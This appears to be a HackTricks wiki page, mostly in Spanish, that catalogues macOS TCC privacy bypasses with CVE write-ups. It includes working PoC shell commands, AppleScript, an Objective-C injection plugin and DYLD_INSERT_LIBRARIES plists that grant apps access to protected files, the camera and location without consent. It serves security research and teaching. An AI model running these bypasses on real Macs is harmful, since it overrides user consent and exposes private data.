# Bypasses de macOS TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidad

### Write Bypass

Esto no es un bypass, es simplemente cómo funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso para leer el Desktop de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El **extended attribute `com.apple.macl`** se añade al nuevo **file** para dar a la **creators app** acceso para leerlo.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Es posible **colocar una ventana sobre el aviso de TCC** para hacer que el usuario lo **acepte** sin darse cuenta. Puedes encontrar un PoC en [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

El atacante puede **crear apps con cualquier nombre** (por ejemplo, Finder, Google Chrome...) en el **`Info.plist`** y hacer que soliciten acceso a alguna ubicación protegida por TCC. El usuario pensará que la aplicación legítima es la que solicita este acceso.\
Además, es posible **eliminar la app legítima del Dock y colocar la falsa en su lugar**, de modo que, cuando el usuario haga clic en la falsa (que puede usar el mismo icono), esta podría llamar a la legítima, solicitar permisos de TCC y ejecutar un malware, haciendo creer al usuario que la app legítima solicitó el acceso.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Más información y PoC en:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

De forma predeterminada, el acceso mediante **SSH solía tener "Full Disk Access"**. Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo de la lista no eliminará esos privilegios):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: De forma predeterminada, el acceso mediante SSH solía tener "Full Disk Access". Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo...](<../../../../../images/image (1077).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido eludir esta protección**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Ten en cuenta que ahora, para poder habilitar SSH, necesitas **Full Disk Access**

### Handle extensions - CVE-2022-26767

El atributo **`com.apple.macl`** se asigna a los archivos para conceder a una **determinada aplicación permisos para leerlos.** Este atributo se establece cuando se hace **drag\&drop** de un archivo sobre una app o cuando un usuario hace **doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una app maliciosa** para gestionar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (por lo que el archivo malicioso obtendría acceso para leerlo).<sup>[[23]](#references)</sup>

### iCloud

El entitlement **`com.apple.private.icloud-account-access`** permite comunicarse con el servicio XPC **`com.apple.iCloudHelper`**, que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este entitlement y otros que lo permitían.

Para obtener más **información** sobre el exploit para **obtener tokens de iCloud** mediante ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Una app con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras Apps**. Esto significa que podría **abusar de los permisos concedidos a las otras Apps**.<sup>[[2]](#references)</sup>

Para obtener más información sobre Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por ejemplo, si una App tiene permiso de **Automation sobre `iTerm`**, en este ejemplo **`Terminal`** tiene acceso a iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y utilizarlo para realizar acciones:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### A través de Finder

O si una App tiene acceso a través de Finder, podría ejecutar un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamiento de la App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **tccd daemon** de userland utilizaba la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC en: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), y dado que el daemon TCC se ejecuta mediante `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.<sup>[[19]](#references)</sup>\
Por lo tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio** **controlado**, **reiniciar** el daemon **TCC** y, a continuación, **modificar directamente la base de datos de TCC** para concederse todos los **TCC entitlements** disponibles sin mostrar ningún aviso al usuario final.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Por tanto, se podía pedir a Notes que copiara un archivo protegido en una nota (es decir, en una ubicación no protegida) y después acceder al archivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

El binario `/usr/libexec/lsd`, junto con la library `libsecurity_translocate`, tenía el entitlement `com.apple.private.nullfs_allow`, que le permitía crear montajes **nullfs**, y tenía el entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a cualquier archivo.

Era posible añadir el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y, entonces, este mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, donde se podía **acceder** a todos los documentos dentro de Library.

### CVE-2024-44131 - FileProvider symlink race

Las aplicaciones que delegan las operaciones de archivos a un **privileged helper** (en este caso, **`fileproviderd`** / **`Files.app`**) copian o mueven elementos **en nombre del usuario**, por lo que la copia se ejecuta con los privilegios del helper en lugar de los del caller.

Jamf Threat Labs demostró que la validación del symlink realizada antes de la operación puede sufrir una **race**: en lugar de colocar el symlink en el componente **final** de la ruta (que es el que se comprueba), el atacante intercambia un directorio **intermedio** de la ruta **después de que la copia ya haya comenzado**. Entonces, el privileged helper sigue el enlace controlado por el atacante y lee o escribe en ubicaciones protegidas por TCC **sin mostrar nunca un prompt**.<sup>[[5]](#references)</sup>

Los directorios que **no están protegidos** por un UUID aleatorio en su ruta (por ejemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) son los objetivos más fáciles, porque el atacante puede predecir la ruta completa para ejecutar la race.

> [!TIP]
> Este es el patrón genérico que se debe buscar: **cualquier proceso privilegiado que resuelva una ruta más de una vez** (check-then-use, o `rename()`/`copyfile()` resolviendo el origen y el destino por separado) puede sufrir una race si se intercambia un directorio en el centro de la ruta. Solo `O_NOFOLLOW_ANY`, `openat()` sobre un directorio FD ya abierto, o `realpath()` + una revalidación cierran realmente la ventana.

Más información en [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` puede compilarse con `SQLITE_ENABLE_SQLLOG`, lo que añade un hook de logging controlado por variables de entorno ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – para **cada base de datos que se abre**, se escriben en `path` una **copia del archivo de la base de datos** y un log de las sentencias SQL (el directorio debe existir previamente).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – toma una **copia nueva cada vez** que se abre o adjunta una DB, en lugar de reutilizar una.
- **`SQLITE_SQLLOG_CONDITIONAL`** – solo registra una conexión si existe un archivo `<database>-sqllog` junto a la DB principal.

Si se puede inyectar esta variable en un proceso que tiene **FDA** y abre bases de datos SQLite, este **copiará sin problemas esas bases de datos protegidas** en un directorio bajo tu control. Como el nombre de archivo de destino se obtiene de datos controlados por el atacante, un **symlink colocado en el destino** convierte la misma primitive en una **escritura arbitraria de archivos** con los privilegios del proceso objetivo.

### **SQLITE_AUTO_TRACE**

Si se establece la variable de entorno **`SQLITE_AUTO_TRACE`**, la library **`libsqlite3.dylib`** comenzará a **registrar** todas las consultas SQL. Muchas aplicaciones utilizaban esta library, por lo que era posible registrar todas sus consultas SQLite.<sup>[[22]](#references)</sup>

Varias aplicaciones de Apple utilizaban esta library para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

The two previous entries are instances of the same generic technique, and it is worth hunting for more: **frameworks cargados en apps con privilegios TCC suelen exponer variables de entorno de depuración/registro que hacen que el proceso cree un archivo en una ruta controlada por el caller**.

Workflow to find them:

1. Pick a target with FDA or another juicy TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) and list the frameworks it links (`otool -L`, `vmmap`).
2. Grep those frameworks for `getenv` strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Set candidate variables via `launchctl setenv NAME /path/you/control`, launch the app and watch what it does on the filesystem with `fs_usage -w -f filesys <pid>` or `sudo fs_usage | grep <path>`.
4. If the process **creates or renames** a file in your directory, you have a write primitive: point the destination at a symlink (or race an intermediate directory, as in CVE-2024-44131 above) to redirect it onto `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Two things limit this. First, **`DYLD_*` variables are ignored for hardened-runtime binaries** unless the app ships the [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — see also [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Second, Apple removes individual framework debug variables as they get reported, so a variable that worked on one macOS release is often gone on the next. If an app silently refuses to launch after you set one, treat that variable as already filtered.<sup>[[7]](#references)[[8]](#references)</sup>

Consulta [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para ver el truco equivalente con variables del linker.

### Apple Remote Desktop

Como root, podrías habilitar este servicio y el **ARD agent tendría acceso total al disco**, que posteriormente podría ser abusado por un usuario para hacer que copie una nueva **TCC user database**.

## Mediante **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario consigue reiniciar TCC con una variable de entorno $HOME que apunte a una **carpeta diferente**, podría crear una nueva base de datos TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que conceda cualquier permiso TCC a cualquier app.

> [!TIP]
> Ten en cuenta que Apple utiliza la configuración almacenada en el perfil del usuario, dentro del atributo **`NFSHomeDirectory`**, para determinar el **valor de `$HOME`**; por tanto, si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **weaponize** esta opción con un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Get a _csreq_ blob for the target app.
2. Plant a fake _TCC.db_ file with required access and the _csreq_ blob.
3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modify the Directory Services entry to change the user’s home directory.
5. Import the modified Directory Services entry with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop the user’s _tccd_ and reboot the process.

El segundo POC utilizaba **`/usr/libexec/configd`**, que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, mediante la cual un atacante podía especificar un **Bundle personalizado para cargar**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** de cambiar la carpeta de inicio del usuario por una **inyección de código en `configd`**.

Para más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Mediante process injection

Existen distintas técnicas para injectar código dentro de un proceso y abusar de sus privilegios TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Además, el process injection más común encontrado para bypass TCC se realiza mediante **plugins (load library)**.\
Los plugins son código adicional, normalmente en forma de libraries o plist, que será **cargado por la aplicación principal** y se ejecutará bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos concedidos o entitlements), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con la extensión **`.daplug`** y **no tenía el runtime hardened**.

Para weaponizear este CVE, se **cambia** `NFSHomeDirectory` (abusando del entitlement anterior) para poder **tomar el control de la base de datos TCC del usuario** y bypass TCC.

Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitía la inyección de código** y el segundo le daba acceso para **gestionar TCC**.

Este binario permitía cargar **plug-ins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos TCC** con este POC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Las aplicaciones del sistema que abren un flujo de cámara mediante Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan en el proceso estos plugins, ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringido por SIP).

Simplemente almacenar allí una biblioteca con el **constructor** común permitirá **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para más información sobre cómo explotarlo fácilmente, [**consulta el informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los entitlements **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código dentro del proceso y utilizar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de él para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes [**encontrar el payload en el writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Observa cómo, para utilizar la variable de entorno para cargar una library, se creó un **plist personalizado** para inyectar esta library y se utilizó **`launchctl`** para iniciarla:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Mediante invocaciones de open

Es posible invocar **`open`** incluso estando en un sandbox

### Scripts de Terminal

Es bastante común otorgar **Full Disk Access (FDA)** a Terminal, al menos en ordenadores utilizados por personas técnicas. También es posible invocar scripts **`.terminal`** con este acceso.

Los scripts **`.terminal`** son archivos plist como este, con el comando que se ejecutará en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y ejecutarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mediante montaje

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar un snapshot de Time Machine y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser concedido por un administrador.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Montar sobre el archivo TCC

Aunque el archivo de la base de datos de TCC estaba protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consulta el **exploit completo** en el [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Como se explica en el [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE abusaba de `diskarbitrationd`.<sup>[[16]](#references)</sup>

La función `DADiskMountWithArgumentsCommon` del framework público `DiskArbitration` realizaba las comprobaciones de seguridad. Sin embargo, es posible evadirlas llamando directamente a `diskarbitrationd` y, por lo tanto, usar elementos `../` en la ruta y symlinks.

Esto permitía a un atacante realizar montajes arbitrarios en cualquier ubicación, incluso sobre la base de datos de TCC, debido al entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar el disco completo y montarlo en otra ubicación, evadiendo las protecciones de TCC.

### CVE-2022-22655 - Location Services

Location Services **no** se almacenan en una base de datos de TCC como los demás servicios. Son gestionados por `locationd`, que mantiene su propia lista de permitidos en **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Cada entrada está identificada por el cliente (bundle ID o ruta del ejecutable) y contiene campos como `Authorized`, `BundleId`, `Executable` y `Registered`.<sup>[[4]](#references)</sup>

El archivo `clients.plist` está protegido por Sandbox/TCC y no se puede editar ni siquiera como root, pero el directorio **`/var/db/locationd/` no estaba protegido frente al mounting**. Por lo tanto, un atacante ejecutándose como root podía crear una disk image que contuviera su propio `clients.plist` (con su binario marcado como `Authorized`), montarla sobre el directorio y reiniciar `locationd` para que la allow-list falsificada surtiera efecto.<sup>[[3]](#references)</sup>

> [!TIP]
> Este es el mismo patrón que en los TCC bypasses de `hdiutil`/`mount` anteriores: el *archivo* está protegido, pero el *directorio en el que se encuentra* no, por lo que se reemplaza todo el directorio en lugar del archivo.

## Mediante startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Mediante grep

En varias ocasiones, los archivos almacenan información sensible, como emails, números de teléfono, mensajes... en ubicaciones no protegidas (lo que Apple considera una vulnerabilidad).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Esto ya no funciona, pero [**funcionaba en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Otra forma usando [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
